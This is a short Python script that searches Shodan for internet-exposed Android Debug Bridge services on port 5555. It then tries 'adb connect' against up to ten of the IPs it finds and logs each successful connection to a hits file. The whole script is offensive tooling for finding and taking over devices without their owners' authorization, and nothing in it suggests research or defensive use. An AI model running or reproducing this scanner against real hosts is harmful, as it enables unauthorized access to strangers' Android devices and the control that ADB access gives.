import requests
import subprocess
import time

SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY'
ADB_PORT = 5555
RESULT_LIMIT = 10
LOG_FILE = "adb_hits.txt"

def search_shodan_adb():
    print("[*] Searching Shodan...")
    url = f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=port:{ADB_PORT}+product:'Android Debug Bridge'"
    try:
        r = requests.get(url)
        matches = r.json().get("matches", [])[:RESULT_LIMIT]
        return [m["ip_str"] for m in matches if "ip_str" in m]
    except Exception as e:
        print(f"[!] Error: {e}")
        return []

def adb_connect(ip):
    print(f"[*] Connecting to {ip}")
    result = subprocess.run(["adb", "connect", f"{ip}:{ADB_PORT}"], capture_output=True, text=True)
    if "connected" in result.stdout.lower():
        with open(LOG_FILE, "a") as f:
            f.write(f"{ip}\n")
        return True
    return False

def main():
    targets = search_shodan_adb()
    for ip in targets:
        adb_connect(ip)
        time.sleep(2)

if __name__ == "__main__":
    main()
